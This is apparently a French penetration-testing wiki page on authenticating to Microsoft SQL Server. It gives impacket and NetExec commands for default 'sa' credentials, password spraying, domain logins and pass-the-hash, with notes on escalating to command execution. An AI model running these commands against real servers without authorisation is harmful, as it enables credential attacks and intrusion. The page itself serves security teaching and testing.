---
order: 2
title: "Accès MSSQL : s'authentifier à l'instance"
description: "Obtenir une session SQL Server authentifiée : connexions SQL via des identifiants par défaut et faibles ou par spraying, authentification Windows et de domaine, et le rôle du rôle public et de l'accès guest comme point d'appui initial."
keywords:
  - accès MSSQL
  - connexion SQL
  - authentification Windows
  - password spraying
  - rôle public
---

# Accès

SQL Server accepte deux modes d'authentification, et tous deux sont des voies d'entrée : les **connexions SQL** (nom d'utilisateur et mot de passe stockés dans l'instance) et l'**authentification Windows** (comptes locaux ou de domaine). L'objectif ici est une session authentifiée quelconque, aussi peu privilégiée soit-elle, car `public` seul suffit à commencer l'énumération et souvent la coercition.

## Connexions SQL

Les connexions SQL par défaut et faibles sont courantes, avant tout `sa` :

```bash
# Authenticate a SQL login
mssqlclient.py 'sa:Password123!@<target>'
impacket-mssqlclient WORKGROUP/sa:'Password123!'@<target>

# Spray SQL logins across an instance (respect lockout where set)
nxc mssql <target> -u sa -p passwords.txt --local-auth
```

## Authentification Windows et de domaine

```bash
# Domain account (password or hash), mapping to a Windows login/principal
mssqlclient.py -windows-auth 'example.local/user:password@<target>'
nxc mssql <target> -u user -p password -d example.local
nxc mssql <target> -u user -H <nthash> -d example.local   # pass-the-hash to MSSQL
```

## Notes d'exploitation

- `sa` est **sysadmin**, donc un succès sur `sa` est une [exécution de commandes](command-execution.md) immédiate ; un mot de passe `sa` faible ou réutilisé est le gain MSSQL classique.
- Une connexion de domaine qui se mappe dans l'instance est souvent plus utile qu'une connexion SQL, car elle peut être atteinte par [relais](coercion-and-relay.md) et par [pass-the-hash](../../directory/active-directory/authentication/ntlm/pass-the-hash.md) vers MSSQL.
- Même une session `public` non privilégiée permet l'[énumération](enumeration.md), les procédures de coercition, et la recherche de chemins d'[usurpation](impersonation.md) et de [serveurs liés](linked-servers.md).
- L'accès `guest` à une base élargit la portée sans octroi explicite, vérifiez donc quelles bases une connexion de bas niveau peut faire `USE`.

## Outils

- **Impacket `mssqlclient.py`** (`-windows-auth`, `-hashes`) : sessions interactives avec authentification SQL ou Windows et pass-the-hash.
- **NetExec `mssql`** (`-u/-p/-H`, `--local-auth`) : authentification, spraying et pass-the-hash à grande échelle.

## Références

- [NetExec: MSSQL authentication](https://www.netexec.wiki/mssql-protocol/authentication)
- [HackTricks: pentesting MSSQL](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
- [Microsoft: choose an authentication mode](https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode)
